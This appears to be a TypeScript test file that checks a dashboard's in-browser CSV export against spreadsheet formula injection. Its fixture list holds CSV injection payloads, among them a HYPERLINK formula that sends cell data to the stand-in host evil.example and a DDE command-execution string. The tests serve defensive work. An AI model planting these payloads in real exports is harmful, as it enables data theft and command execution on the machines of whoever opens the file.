// export-injection.test.ts: the dashboard's in-browser CSV download.
//
// This is the export a coordinator actually clicks. It is a SEPARATE code path from the api's
// coordinator export, and hardening only the api side left this one injectable — quoting every
// cell does not help, because a spreadsheet unquotes first and then evaluates.
//
// The activity column is activityLabel(taskId), which falls through to the raw taskId for any
// unrecognised value, and taskId arrives from a reporter's signed payload. Anyone can generate
// a key and sign a proof, so this is unauthenticated input reaching a programme officer's
// spreadsheet.

import { test } from "node:test";
import assert from "node:assert/strict";
import { csv } from "../app/dashboard/exports/ExportButton";
import type { ProofSummary } from "../lib/api";

const ATTACKS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
  "=cmd|'/c calc'!A1",
  "+1+1",
  "-2+3",
  "@SUM(1+1)",
  "\tformula",
];

function proof(taskId: string): ProofSummary {
  return {
    proofHash: "a".repeat(64),
    taskId,
    geohashRegion: "u4pru",
    capturedAt: "2026-01-01T00:00:00.000Z",
    attestationCount: 0,
  } as ProofSummary;
}

for (const attack of ATTACKS) {
  test(`the browser export cannot emit a live formula: ${JSON.stringify(attack.slice(0, 18))}`, () => {
    const out = csv([proof(attack)]);
    const row = out.split("\n").slice(1).join("\n");

    // activityLabel title-cases but preserves the payload, so it must appear quote-prefixed.
    const idx = row.indexOf(attack.replace(/"/g, '""').slice(1));
    assert.ok(idx > 0, `the payload should still be present, just inert: ${row}`);

    // No data cell may begin with a formula character.
    for (const cell of row.split(",")) {
      const bare = cell.startsWith('"') ? cell.slice(1) : cell;
      assert.ok(
        !/^[=+\-@\t\r\n]/.test(bare),
        `cell begins with a formula character: ${JSON.stringify(cell)}`,
      );
    }
  });
}

test("an ordinary report exports unchanged and still has a header", () => {
  const out = csv([proof("solar-panel-install")]);
  const [head, row] = out.split("\n");
  assert.equal(head, "activity,programme,approximate_region,captured_date,review_status,confirmations");
  assert.ok(row?.includes("Solar panels installed"), row);
  assert.ok(row?.includes("u4pru"), row);
  assert.ok(!row?.includes("'"), "nothing benign should be quote-prefixed");
});

test("no rows means header only", () => {
  assert.equal(csv([]), "activity,programme,approximate_region,captured_date,review_status,confirmations");
});
